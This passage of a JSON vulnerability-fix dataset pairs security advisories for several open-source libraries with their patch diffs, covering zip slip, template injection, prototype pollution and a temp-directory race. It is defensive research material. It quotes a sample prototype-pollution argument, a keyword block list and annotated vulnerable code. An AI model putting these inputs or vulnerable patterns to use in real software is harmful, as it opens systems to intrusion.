input.","published_date":"2021-09-02","chain_len":1,"project":"https:\/\/github.com\/aheckmann\/mpath","commit_href":"https:\/\/github.com\/aheckmann\/mpath\/commit\/89402d2880d4ea3518480a8c9847c541f2d824fc","commit_sha":"89402d2880d4ea3518480a8c9847c541f2d824fc","patch":"SINGLE","chain_ord":"['89402d2880d4ea3518480a8c9847c541f2d824fc']","before_first_fix_commit":"{'03c4efef8b25425476c1e0d7b6a0fb5adc18c0f9'}","last_fix_commit":"89402d2880d4ea3518480a8c9847c541f2d824fc","chain_ord_pos":1.0,"commit_datetime":"09\/01\/2021, 15:12:24","message":"fix: throw error if `parts` contains an element that isn't a string or number\n\nFix #13","author":"Valeri Karpov","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'lib\/index.js': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mongoosejs\/mpath\/raw\/89402d2880d4ea3518480a8c9847c541f2d824fc\/lib%2Findex.js', 'patch': \"@@ -64,6 +64,9 @@ exports.get = function(path, o, special, map) {\\n \\n   for (var i = 0; i < parts.length; ++i) {\\n     part = parts[i];\\n+    if (typeof parts[i] !== 'string' && typeof parts[i] !== 'number') {\\n+      throw new TypeError('Each segment of path to `get()` must be a string or number, got ' + typeof parts[i]);\\n+    }\\n \\n     if (Array.isArray(obj) && !\/^\\\\d+$\/.test(part)) {\\n       \/\/ reading a property from the array items\\n@@ -112,6 +115,9 @@ exports.has = function(path, o) {\\n   var len = parts.length;\\n   var cur = o;\\n   for (var i = 0; i < len; ++i) {\\n+    if (typeof parts[i] !== 'string' && typeof parts[i] !== 'number') {\\n+      throw new TypeError('Each segment of path to `has()` must be a string or number, got ' + typeof parts[i]);\\n+    }\\n     if (cur == null || typeof cur !== 'object' || !(parts[i] in cur)) {\\n       return false;\\n     }\\n@@ -143,6 +149,9 @@ exports.unset = function(path, o) {\\n     if (cur == null || typeof cur !== 'object' || !(parts[i] in cur)) {\\n       return false;\\n     }\\n+    if (typeof parts[i] !== 'string' && typeof parts[i] !== 'number') {\\n+      throw new TypeError('Each segment of path to `unset()` must be a string or number, got ' + typeof parts[i]);\\n+    }\\n     \/\/ Disallow any updates to __proto__ or special properties.\\n     if (ignoreProperties.indexOf(parts[i]) !== -1) {\\n       return false;\\n@@ -193,6 +202,9 @@ exports.set = function(path, val, o, special, map, _copying) {\\n   if (null == o) return;\\n \\n   for (var i = 0; i < parts.length; ++i) {\\n+    if (typeof parts[i] !== 'string' && typeof parts[i] !== 'number') {\\n+      throw new TypeError('Each segment of path to `set()` must be a string or number, got ' + typeof parts[i]);\\n+    }\\n     \/\/ Silently ignore any updates to `__proto__`, these are potentially\\n     \/\/ dangerous if using mpath with unsanitized data.\\n     if (ignoreProperties.indexOf(parts[i]) !== -1) {\"}}","message_norm":"fix: throw error if `parts` contains an element that isn't a string or number\n\nfix #13","language":"en","entities":"[('error', 'FLAW', ''), ('fix', 'ACTION', ''), ('#13', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/index.js'])","num_files":1.0},{"index":2541,"vuln_id":"GHSA-p9j6-4pjr-gp48","cwe_id":"{'CWE-22'}","score":5.3,"chain":"{'https:\/\/github.com\/joniles\/mpxj\/commit\/8eaf4225048ea5ba7e59ef4556dab2098fcc4a1d'}","dataset":"osv","summary":"MPXJ path Traversal vulnerability common\/InputStreamHelper.java in Packwood MPXJ before 8.3.5 allows directory traversal in the zip stream handler flow, leading to the writing of files to arbitrary locations.","published_date":"2020-12-18","chain_len":1,"project":"https:\/\/github.com\/joniles\/mpxj","commit_href":"https:\/\/github.com\/joniles\/mpxj\/commit\/8eaf4225048ea5ba7e59ef4556dab2098fcc4a1d","commit_sha":"8eaf4225048ea5ba7e59ef4556dab2098fcc4a1d","patch":"SINGLE","chain_ord":"['8eaf4225048ea5ba7e59ef4556dab2098fcc4a1d']","before_first_fix_commit":"{'1eed5f01ac8e49b433e0538bdc079caeda7d6fd7'}","last_fix_commit":"8eaf4225048ea5ba7e59ef4556dab2098fcc4a1d","chain_ord_pos":1.0,"commit_datetime":"12\/14\/2020, 12:13:14","message":"zip slip fix","author":"Jon Iles","comments":null,"stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'src\/main\/java\/net\/sf\/mpxj\/common\/InputStreamHelper.java': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/joniles\/mpxj\/raw\/8eaf4225048ea5ba7e59ef4556dab2098fcc4a1d\/src%2Fmain%2Fjava%2Fnet%2Fsf%2Fmpxj%2Fcommon%2FInputStreamHelper.java', 'patch': '@@ -114,6 +114,7 @@ public static File writeZipStreamToTempDir(InputStream inputStream) throws IOExc\\n     *\/\\n    private static void processZipStream(File dir, InputStream inputStream) throws IOException\\n    {\\n+      String canonicalDestinationDirPath = dir.getCanonicalPath();\\n       ZipInputStream zip = new ZipInputStream(inputStream);\\n       while (true)\\n       {\\n@@ -124,6 +125,14 @@ private static void processZipStream(File dir, InputStream inputStream) throws I\\n          }\\n \\n          File file = new File(dir, entry.getName());\\n+\\n+         \/\/ https:\/\/snyk.io\/research\/zip-slip-vulnerability\\n+         String canonicalDestinationFile = file.getCanonicalPath();\\n+         if (!canonicalDestinationFile.startsWith(canonicalDestinationDirPath + File.separator))\\n+         {\\n+            throw new IOException(\"Entry is outside of the target dir: \" + entry.getName());\\n+         }\\n+\\n          if (entry.isDirectory())\\n          {\\n             FileHelper.mkdirsQuietly(file);'}}","message_norm":"zip slip fix","language":"ro","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/net\/sf\/mpxj\/common\/InputStreamHelper.java'])","num_files":1.0},{"index":2543,"vuln_id":"GHSA-p9m8-27x8-rg87","cwe_id":"{'CWE-94'}","score":10.0,"chain":"{'https:\/\/github.com\/jmrozanec\/cron-utils\/commit\/cfd2880f80e62ea74b92fa83474c2aabdb9899da', 'https:\/\/github.com\/jmrozanec\/cron-utils\/commit\/d6707503ec2f20947f79e38f861dba93b39df9da'}","dataset":"osv","summary":"Critical vulnerability found in cron-utils ### Impact\nA Template Injection was identified in cron-utils enabling attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability. Versions up to 9.1.2 are susceptible to this vulnerability. Please note, that only projects using the @Cron annotation to validate untrusted Cron expressions are affected.\n\n### Patches\nThe issue was patched and a new version was released. Please upgrade to version 9.1.6.\n\n### Workarounds\nThere are no known workarounds up to this moment.\n\n### References\nA description of the issue is provided in [issue 461](https:\/\/github.com\/jmrozanec\/cron-utils\/issues\/461)\n\n### For more information\nIf you have any questions or comments about this advisory:\n\nOpen an issue in the [cron-utils Github repository](https:\/\/github.com\/jmrozanec\/cron-utils)","published_date":"2021-11-15","chain_len":2,"project":"https:\/\/github.com\/jmrozanec\/cron-utils","commit_href":"https:\/\/github.com\/jmrozanec\/cron-utils\/commit\/d6707503ec2f20947f79e38f861dba93b39df9da","commit_sha":"d6707503ec2f20947f79e38f861dba93b39df9da","patch":"MULTI","chain_ord":"['d6707503ec2f20947f79e38f861dba93b39df9da', 'cfd2880f80e62ea74b92fa83474c2aabdb9899da']","before_first_fix_commit":"{'9c93c17b8107e58073443a045e22274467b88aae', 'd6707503ec2f20947f79e38f861dba93b39df9da'}","last_fix_commit":"cfd2880f80e62ea74b92fa83474c2aabdb9899da","chain_ord_pos":1.0,"commit_datetime":"10\/30\/2021, 13:11:58","message":"Merge pull request #493 from pwntester\/patch-1\n\nPrevent arbitrary EL expression evaluation","author":"jmrozanec","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/main\/java\/com\/cronutils\/validation\/CronValidator.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jmrozanec\/cron-utils\/raw\/d6707503ec2f20947f79e38f861dba93b39df9da\/src%2Fmain%2Fjava%2Fcom%2Fcronutils%2Fvalidation%2FCronValidator.java', 'patch': '@@ -30,7 +30,7 @@ public boolean isValid(String value, ConstraintValidatorContext context) {\\n             return true;\\n         } catch (IllegalArgumentException e) {\\n             context.disableDefaultConstraintViolation();\\n-            context.buildConstraintViolationWithTemplate(e.getMessage()).addConstraintViolation();\\n+            context.buildConstraintViolationWithTemplate(\"Error parsing the Cron expression\").addConstraintViolation();\\n             return false;\\n         }\\n     }'}}","message_norm":"merge pull request #493 from pwntester\/patch-1\n\nprevent arbitrary el expression evaluation","language":"en","entities":"[('#493', 'ISSUE', ''), ('prevent', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/com\/cronutils\/validation\/CronValidator.java'])","num_files":1.0},{"index":2545,"vuln_id":"GHSA-p9pc-299p-vxgp","cwe_id":"{'CWE-915'}","score":5.3,"chain":"{'https:\/\/github.com\/yargs\/yargs-parser\/commit\/63810ca1ae1a24b08293a4d971e70e058c7a41e2', 'https:\/\/github.com\/yargs\/yargs-parser\/commit\/1c417bd0b42b09c475ee881e36d292af4fa2cc36'}","dataset":"osv","summary":"yargs-parser Vulnerable to Prototype Pollution Affected versions of `yargs-parser` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  \nParsing the argument `--foo.__proto__.bar baz'` adds a `bar` property with value `baz` to all objects. This is only exploitable if attackers have control over the arguments being passed to `yargs-parser`.\n\n\n\n## Recommendation\n\nUpgrade to versions 13.1.2, 15.0.1, 18.1.1 or later.","published_date":"2020-09-04","chain_len":2,"project":"https:\/\/github.com\/yargs\/yargs-parser","commit_href":"https:\/\/github.com\/yargs\/yargs-parser\/commit\/1c417bd0b42b09c475ee881e36d292af4fa2cc36","commit_sha":"1c417bd0b42b09c475ee881e36d292af4fa2cc36","patch":"MULTI","chain_ord":"['63810ca1ae1a24b08293a4d971e70e058c7a41e2', '1c417bd0b42b09c475ee881e36d292af4fa2cc36']","before_first_fix_commit":"{'e93a345e1e585ba5df97c1da438673e7f2e8909b'}","last_fix_commit":"1c417bd0b42b09c475ee881e36d292af4fa2cc36","chain_ord_pos":2.0,"commit_datetime":"03\/10\/2021, 19:14:27","message":"fix(security): address GHSA-p9pc-299p-vxgp (#362)\n\nUpdate release automation to allow for back ports.","author":"Benjamin E. Coe","comments":"{'com_1': {'author': 'kennethalegre19', 'datetime': '10\/19\/2021, 05:07:29', 'body': '`.github\/workflows\/release-please.yml'}}","stats":"{'additions': 15, 'deletions': 0, 'total': 15}","files":"{'.github\/workflows\/release-please.yml': {'additions': 15, 'deletions': 0, 'changes': 15, 'status': 'added', 'raw_url': 'https:\/\/github.com\/yargs\/yargs-parser\/raw\/1c417bd0b42b09c475ee881e36d292af4fa2cc36\/.github%2Fworkflows%2Frelease-please.yml', 'patch': '@@ -0,0 +1,15 @@\\n+on:\\n+   push:\\n+     branches:\\n+       - v5.x.x\\n+name: release-please\\n+jobs:\\n+  release-please:\\n+    runs-on: ubuntu-latest\\n+    steps:\\n+      - uses: google-github-actions\/release-please-action@v2\\n+        with:\\n+          token: ${{ secrets.GITHUB_TOKEN }}\\n+          release-type: node\\n+          package-name: yargs-parser\\n+          default-branch: v5.x.x'}}","message_norm":"fix(security): address ghsa-p9pc-299p-vxgp (#362)\n\nupdate release automation to allow for back ports.","language":"en","entities":"[('fix(security', 'SECWORD', ''), ('ghsa-p9pc-299p-vxgp', 'VULNID', 'GHSA'), ('#362', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['.github\/workflows\/release-please.yml'])","num_files":1.0},{"index":2547,"vuln_id":"GHSA-pc22-3g76-gm6j","cwe_id":"{'CWE-379', 'CWE-378'}","score":9.3,"chain":"{'https:\/\/github.com\/swagger-api\/swagger-codegen\/commit\/987ea7a30b463cc239580d6ad166c707ae942a89'}","dataset":"osv","summary":"Generator Web Application: Local Privilege Escalation Vulnerability via System Temp Directory ### Impact\n\nOn Unix like systems, the system's temporary directory is shared between all users on that system. A collocated user can observe the process of creating a temporary sub directory in the shared temporary directory and race to complete the creation of the temporary subdirectory. \n\nThis vulnerability is local privilege escalation because the contents of the `outputFolder` can be appended to by an attacker. As such, code written to this directory, when executed can be attacker controlled.\n\n#### Java Code\n\nThe method `File.createTempFile` from the JDK is vulnerable to this local information disclosure vulnerability.\n\nhttps:\/\/github.com\/swagger-api\/swagger-codegen\/blob\/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab\/modules\/swagger-generator\/src\/main\/java\/io\/swagger\/generator\/online\/Generator.java#L174-L185\n\n\n### Patches\n\nFix has been applied to the master branch with:\n\n* https:\/\/github.com\/swagger-api\/swagger-codegen\/commit\/987ea7a30b463cc239580d6ad166c707ae942a89\n\nincluded in release: 2.4.19\n\n\n### References\n\n* [CWE-378: Creation of Temporary File With Insecure Permissions](https:\/\/cwe.mitre.org\/data\/definitions\/378.html)\n* [CWE-379: Creation of Temporary File in Directory with Insecure Permissions](https:\/\/cwe.mitre.org\/data\/definitions\/379.html)\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Email us at [security@swagger.io](mailto:security@swagger.io)\n\n#### Original vulnerability report\n\n> I'm performing OSS security research under the GitHub Security Lab Bug Bounty program.\n> I've been using a custom CodeQL query to find local temporary directory vulnerabilities in OSS with three custom CodeQL queries.\n> \n> - https:\/\/github.com\/github\/codeql\/pull\/4388\/files#diff-71d36c0f2bd0b08e32866f873f1c906cdc17277e0ad327c0c6cd2c882f30de4f\n> - https:\/\/github.com\/github\/codeql\/pull\/4388\/files#diff-1893a18a8bf43c011d61a7889d0139b998a5a78701a30fe7722eddd4c506aaac\n> - https:\/\/github.com\/github\/codeql\/pull\/4473\n> \n> The code generated by the Swagger Generator contains a local information disclosure vulnerability. The system temporary directory, on unix-like systems is shared between multiple users. Information written to this directory, or directories created under this directory that do not correctly set the posix standard permissions can have these directories read\/modified by other users.\n> \n> ---\n> \n> This vulnerability exists in the maven plugin.\n> \n> This vulnerability is distinctly different. This vulnerability is most likely a local privilege escalation vulnerability.\n> \n> https:\/\/github.com\/swagger-api\/swagger-codegen\/blob\/068b1ebcb7b04a48ad38f1cadd24bb3810c9f1ab\/modules\/swagger-generator\/src\/main\/java\/io\/swagger\/generator\/online\/Generator.java#L174-L185\n> \n> This vulnerability is very similar to this similar vulnerability I disclosed in the Eclipse Jetty project.\n> \n> https:\/\/github.com\/eclipse\/jetty.project\/security\/advisories\/GHSA-g3wg-6mcf-8jj6\n> \n> This is due to a race condition between the call to `delete` and the call to `mkdirs`.\n> \n> ```java\n> \/\/ ensure file will always be unique by appending random digits\n> File outputFolder = File.createTempFile(\"codegen-\", \"-tmp\"); \/\/ Attacker knows the full path of the file that will be generated\n> \/\/ delete the file that was created\n> outputFolder.delete(); \/\/ Attacker sees file is deleted and begins a race to create their own directory before Swagger Code Generator.\n> \/\/ and make a directory of the same name\n> \/\/ SECURITY VULNERABILITY: Race Condition! - Attacker beats Swagger Code Generator and now owns this directory\n> outputFolder.mkdirs();\n> ```\n> \n> This vulnerability is local privilege escalation because the contents of the `outputFolder` can be appended to by an attacker. As such, code written to this directory, when executed can be attacker controlled.\n> \n> The fix here is to switch to the `Files` API for creating temporary directories. Which does not contain this race condition, and appropriately sets the correct file permissions.\n>","published_date":"2021-03-11","chain_len":1,"project":"https:\/\/github.com\/swagger-api\/swagger-codegen","commit_href":"https:\/\/github.com\/swagger-api\/swagger-codegen\/commit\/987ea7a30b463cc239580d6ad166c707ae942a89","commit_sha":"987ea7a30b463cc239580d6ad166c707ae942a89","patch":"SINGLE","chain_ord":"['987ea7a30b463cc239580d6ad166c707ae942a89']","before_first_fix_commit":"{'3b40539b2260fbf1c8198dceb8797599c3944ef7', 'a4b766beb6141ed66dbe1be23bce32366b5f9486'}","last_fix_commit":"987ea7a30b463cc239580d6ad166c707ae942a89","chain_ord_pos":1.0,"commit_datetime":"03\/02\/2021, 10:05:49","message":"Merge pull request from GHSA-pc22-3g76-gm6j\n\n security: use java.nio.files in Generator.","author":"Francesco Tumanischvili","comments":null,"stats":"{'additions': 2, 'deletions': 3, 'total': 5}","files":"{'modules\/swagger-generator\/src\/main\/java\/io\/swagger\/generator\/online\/Generator.java': {'additions': 2, 'deletions': 3, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/swagger-api\/swagger-codegen\/raw\/987ea7a30b463cc239580d6ad166c707ae942a89\/modules%2Fswagger-generator%2Fsrc%2Fmain%2Fjava%2Fio%2Fswagger%2Fgenerator%2Fonline%2FGenerator.java', 'patch': '@@ -15,6 +15,7 @@\\n import org.slf4j.LoggerFactory;\\n \\n import java.io.File;\\n+import java.nio.file.Files;\\n import java.util.ArrayList;\\n import java.util.LinkedHashMap;\\n import java.util.List;\\n@@ -173,9 +174,7 @@ public static InputOption serverOptions(@SuppressWarnings(\"unused\") String langu\\n \\n     protected static File getTmpFolder() {\\n         try {\\n-            File outputFolder = File.createTempFile(\"codegen-\", \"-tmp\");\\n-            outputFolder.delete();\\n-            outputFolder.mkdir();\\n+            File outputFolder = Files.createTempDirectory(\"codegen-\").toFile();\\n             outputFolder.deleteOnExit();\\n             return outputFolder;\\n         } catch (Exception e) {'}}","message_norm":"merge pull request from ghsa-pc22-3g76-gm6j\n\n security: use java.nio.files in generator.","language":"en","entities":"[('ghsa-pc22-3g76-gm6j', 'VULNID', 'GHSA'), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/swagger-generator\/src\/main\/java\/io\/swagger\/generator\/online\/Generator.java'])","num_files":1.0},{"index":2548,"vuln_id":"GHSA-pc54-pchm-xcw6","cwe_id":"{'CWE-611', 'CWE-20'}","score":0.0,"chain":"{'https:\/\/github.com\/resteasy\/resteasy\/pull\/611\/commits\/3ab999c899c455a0b0a00bf5e455ed3e8d9ae347', 'https:\/\/github.com\/resteasy\/resteasy\/pull\/611\/commits\/8b5d8cfc963794a74636d9a840e899408ec8fdc6'}","dataset":"osv","summary":"XML External Entity Reference in RESTEasy DocumentProvider in RESTEasy 2.3.7 and 3.0.9 does not configure the (1) external-general-entities or (2) external-parameter-entities features, which allows remote attackers to conduct XML external entity (XXE) attacks via unspecified vectors.","published_date":"2022-05-17","chain_len":2,"project":"https:\/\/github.com\/resteasy\/resteasy","commit_href":"https:\/\/github.com\/resteasy\/resteasy\/pull\/611\/commits\/3ab999c899c455a0b0a00bf5e455ed3e8d9ae347","commit_sha":"3ab999c899c455a0b0a00bf5e455ed3e8d9ae347","patch":"MULTI","chain_ord":"['8b5d8cfc963794a74636d9a840e899408ec8fdc6', '3ab999c899c455a0b0a00bf5e455ed3e8d9ae347']","before_first_fix_commit":"{'8b5d8cfc963794a74636d9a840e899408ec8fdc6'}","last_fix_commit":"3ab999c899c455a0b0a00bf5e455ed3e8d9ae347","chain_ord_pos":2.0,"commit_datetime":"11\/18\/2014, 06:26:03","message":"RESTEASY-1130: Added test for Red Hat version of Xerces in\nTestSecureProcessing.","author":"rsigal","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'resteasy-jaxrs-test\/src\/test\/java\/org\/jboss\/resteasy\/test\/xxe\/TestSecureProcessing.java': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/resteasy\/resteasy\/raw\/3ab999c899c455a0b0a00bf5e455ed3e8d9ae347\/resteasy-jaxrs-test%2Fsrc%2Ftest%2Fjava%2Forg%2Fjboss%2Fresteasy%2Ftest%2Fxxe%2FTestSecureProcessing.java', 'patch': '@@ -7,6 +7,7 @@\\n import javax.ws.rs.Consumes;\\r\\n import javax.ws.rs.POST;\\r\\n import javax.ws.rs.Path;\\r\\n+import javax.xml.parsers.DocumentBuilderFactory;\\r\\n \\r\\n import junit.framework.Assert;\\r\\n \\r\\n@@ -373,6 +374,13 @@ void doEntityExpansionPasses() throws Exception\\n    \\r\\n    void doMaxAttributesFails() throws Exception\\r\\n    {\\r\\n+      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\\r\\n+      System.out.println(\"dbf.getClass(): \" + dbf.getClass());\\r\\n+      if (\"org.apache.xerces.jaxp.DocumentBuilderFactoryImpl\".equals(dbf.getClass().getName()))\\r\\n+      {\\r\\n+         System.out.println(\"Testing with Red Hat version of Xerces, skipping max attributes test\");\\r\\n+         return;\\r\\n+      }\\r\\n       System.out.println(\"entering doMaxAttributesFails()\");\\r\\n       ClientRequest request = new ClientRequest(generateURL(\"\/test\"));\\r\\n       request.body(\"application\/xml\", bigAttributeDoc);'}}","message_norm":"resteasy-1130: added test for red hat version of xerces in\ntestsecureprocessing.","language":"en","entities":"[('added', 'ACTION', ''), ('testsecureprocessing', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['resteasy-jaxrs-test\/src\/test\/java\/org\/jboss\/resteasy\/test\/xxe\/TestSecureProcessing.java'])","num_files":1.0},{"index":2550,"vuln_id":"GHSA-pc58-wgmc-hfjr","cwe_id":"{'CWE-1321'}","score":7.5,"chain":"{'https:\/\/github.com\/mout\/mout\/commit\/3fecf1333e6d71ae72edf48c71dc665e40df7605'}","dataset":"osv","summary":"Prototype Pollution in mout This affects all versions of package mout. The deepFillIn function can be used to 'fill missing properties recursively', while the deepMixIn 'mixes objects into the target object, recursively mixing existing child objects as well'. In both cases, the key used to access the target object recursively is not checked, leading to a Prototype Pollution.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/mout\/mout","commit_href":"https:\/\/github.com\/mout\/mout\/commit\/3fecf1333e6d71ae72edf48c71dc665e40df7605","commit_sha":"3fecf1333e6d71ae72edf48c71dc665e40df7605","patch":"SINGLE","chain_ord":"['3fecf1333e6d71ae72edf48c71dc665e40df7605']","before_first_fix_commit":"{'397fa131ec8090e305397d2db2d607c04440c2f3', '2189378ed476d34b3cd39ba7f1199dbf12b8e51b'}","last_fix_commit":"3fecf1333e6d71ae72edf48c71dc665e40df7605","chain_ord_pos":1.0,"commit_datetime":"07\/15\/2021, 18:58:13","message":"Merge pull request #270 from 418sec\/1-npm-mout\n\nSecurity Fix for Prototype Pollution - huntr.dev","author":"Mathias Paumgarten","comments":"{'com_1': {'author': 'andrew-itscript', 'datetime': '08\/31\/2021, 08:47:19', 'body': '@roboshoes when do you plan to publish these changes to npm?'}, 'com_2': {'author': 'roboshoes', 'datetime': '09\/01\/2021, 17:49:50', 'body': 'Sorry for the delay. Has been released under [`v1.2.3`](https:\/\/www.npmjs.com\/package\/mout\/v\/1.2.3)'}}","stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'src\/object\/set.js': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mout\/mout\/raw\/3fecf1333e6d71ae72edf48c71dc665e40df7605\/src%2Fobject%2Fset.js', 'patch': '@@ -4,6 +4,10 @@ define([\\'.\/namespace\\'], function (namespace) {\\n      * set \"nested\" object property\\n      *\/\\n     function set(obj, prop, val){\\n+        \/\/ prototype pollution mitigation\\n+        if(prop.includes(\\'__proto__\\') || prop.includes(\\'prototype\\') || prop.includes(\\'constructor\\')) {\\n+            return false;\\n+        }\\n         var parts = (\/^(.+)\\\\.(.+)$\/).exec(prop);\\n         if (parts){\\n             namespace(obj, parts[1])[parts[2]] = val;'}}","message_norm":"merge pull request #270 from 418sec\/1-npm-mout\n\nsecurity fix for prototype pollution - huntr.dev","language":"en","entities":"[('#270', 'ISSUE', ''), ('security', 'SECWORD', ''), ('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/object\/set.js'])","num_files":1.0},{"index":2551,"vuln_id":"GHSA-pc5p-h8pf-mvwp","cwe_id":"{'CWE-300'}","score":6.1,"chain":"{'https:\/\/github.com\/TooTallNate\/node-https-proxy-agent\/commit\/36d8cf509f877fa44f4404fce57ebaf9410fe51b'}","dataset":"osv","summary":"Machine-In-The-Middle in https-proxy-agent Versions of `https-proxy-agent` prior to 2.2.3 are vulnerable to Machine-In-The-Middle. The package fails to enforce TLS on the socket if the proxy server responds the to the request with a HTTP status different than 200. This allows an attacker with access to the proxy server to intercept unencrypted communications, which may include sensitive information such as credentials.\n\n\n## Recommendation\n\nUpgrade to version 3.0.0 or 2.2.3.","published_date":"2020-04-16","chain_len":1,"project":"https:\/\/github.com\/TooTallNate\/node-https-proxy-agent","commit_href":"https:\/\/github.com\/TooTallNate\/node-https-proxy-agent\/commit\/36d8cf509f877fa44f4404fce57ebaf9410fe51b","commit_sha":"36d8cf509f877fa44f4404fce57ebaf9410fe51b","patch":"SINGLE","chain_ord":"['36d8cf509f877fa44f4404fce57ebaf9410fe51b']","before_first_fix_commit":"{'5252bb9355ad12802d7e0846e5e7cf4ced54fc63'}","last_fix_commit":"36d8cf509f877fa44f4404fce57ebaf9410fe51b","chain_ord_pos":1.0,"commit_datetime":"10\/07\/2019, 19:53:24","message":"Use an `EventEmitter` to replay failed proxy connect HTTP requests (#77)\n\n* Use an `EventEmitter` to replay failed proxy connect HTTP requests\r\n\r\nThis is a fix for https:\/\/hackerone.com\/reports\/541502.\r\n\r\nAborts the upstream proxy connection and instead uses a vanilla\r\n`EventEmitter` instance to replay the \"data\" events on to. This way,\r\nthe node core `http` Client doesn't attempt to write the HTTP request\r\nthat is intended to go to the destination server to the proxy server.\r\n\r\nCloses #76.\r\n\r\n* Adjust comment","author":"Nathan Rajlich","comments":"{'com_1': {'author': 'jaimeborjas', 'datetime': '04\/17\/2020, 01:17:19', 'body': 'Security fixes'}, 'com_2': {'author': 'donurukiran', 'datetime': '04\/17\/2020, 13:18:32', 'body': 'done with few security issues'}}","stats":"{'additions': 15, 'deletions': 3, 'total': 18}","files":"{'index.js': {'additions': 15, 'deletions': 3, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/TooTallNate\/node-https-proxy-agent\/raw\/36d8cf509f877fa44f4404fce57ebaf9410fe51b\/index.js', 'patch': '@@ -5,6 +5,7 @@\\n var net = require(\\'net\\');\\n var tls = require(\\'tls\\');\\n var url = require(\\'url\\');\\n+var events = require(\\'events\\');\\n var Agent = require(\\'agent-base\\');\\n var inherits = require(\\'util\\').inherits;\\n var debug = require(\\'debug\\')(\\'https-proxy-agent\\');\\n@@ -154,20 +155,32 @@ HttpsProxyAgent.prototype.callback = function connect(req, opts, fn) {\\n       fn(null, sock);\\n     } else {\\n       \/\/ some other status code that\\'s not 200... need to re-play the HTTP header\\n-      \/\/ \"data\" events onto the socket once the HTTP machinery is attached so that\\n-      \/\/ the user can parse and handle the error status code\\n+      \/\/ \"data\" events onto the socket once the HTTP machinery is attached so\\n+      \/\/ that the node core `http` can parse and handle the error status code\\n       cleanup();\\n \\n+      \/\/ the original socket is closed, and a \"fake socket\" EventEmitter is\\n+      \/\/ returned instead, so that the proxy doesn\\'t get the HTTP request\\n+      \/\/ written to it (which may contain `Authorization` headers or other\\n+      \/\/ sensitive data).\\n+      \/\/\\n+      \/\/ See: https:\/\/hackerone.com\/reports\/541502\\n+      socket.destroy();\\n+      socket = new events.EventEmitter();\\n+\\n       \/\/ save a reference to the concat\\'d Buffer for the `onsocket` callback\\n       buffers = buffered;\\n \\n       \/\/ need to wait for the \"socket\" event to re-play the \"data\" events\\n       req.once(\\'socket\\', onsocket);\\n+\\n       fn(null, socket);\\n     }\\n   }\\n \\n   function onsocket(socket) {\\n+    debug(\\'replaying proxy buffer for failed request\\');\\n+\\n     \/\/ replay the \"buffers\" Buffer onto the `socket`, since at this point\\n     \/\/ the HTTP module machinery has been hooked up for the user\\n     if (socket.listenerCount(\\'data\\') > 0) {\\n@@ -177,7 +190,6 @@ HttpsProxyAgent.prototype.callback = function connect(req, opts, fn) {\\n       throw new Error(\\'should not happen...\\');\\n     }\\n \\n-    socket.resume();\\n     \/\/ nullify the cached Buffer instance\\n     buffers = null;\\n   }'}}","message_norm":"use an `eventemitter` to replay failed proxy connect http requests (#77)\n\n* use an `eventemitter` to replay failed proxy connect http requests\r\n\r\nthis is a fix for https:\/\/hackerone.com\/reports\/541502.\r\n\r\naborts the upstream proxy connection and instead uses a vanilla\r\n`eventemitter` instance to replay the \"data\" events on to. this way,\r\nthe node core `http` client doesn't attempt to write the http request\r\nthat is intended to go to the destination server to the proxy server.\r\n\r\ncloses #76.\r\n\r\n* adjust comment","language":"en","entities":"[('#77', 'ISSUE', ''), ('https:\/\/hackerone.com\/reports\/541502', 'URL', ''), ('server', 'SECWORD', ''), ('server', 'SECWORD', ''), ('#76', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":2561,"vuln_id":"GHSA-pfj3-56hm-jwq5","cwe_id":"{'CWE-74'}","score":7.9,"chain":"{'https:\/\/github.com\/jmrozanec\/cron-utils\/commit\/4cf373f7352f5d95f0bf6512af8af326b31c835e'}","dataset":"osv","summary":"Template injection in cron-utils ### Impact\nA Template Injection was identified in cron-utils enabling attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability. Versions up to 9.1.2 are susceptible to this vulnerability. Please note, that only projects using the @Cron annotation to validate untrusted Cron expressions are affected.\n\n### Patches\nThe issue was patched and a new version released. Please upgrade to version 9.1.3.\n\n### Workarounds\nThere are no known workarounds up to this moment.\n\n### References\nA description of the issue is provided in [issue 461](https:\/\/github.com\/jmrozanec\/cron-utils\/issues\/461)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [cron-utils Github 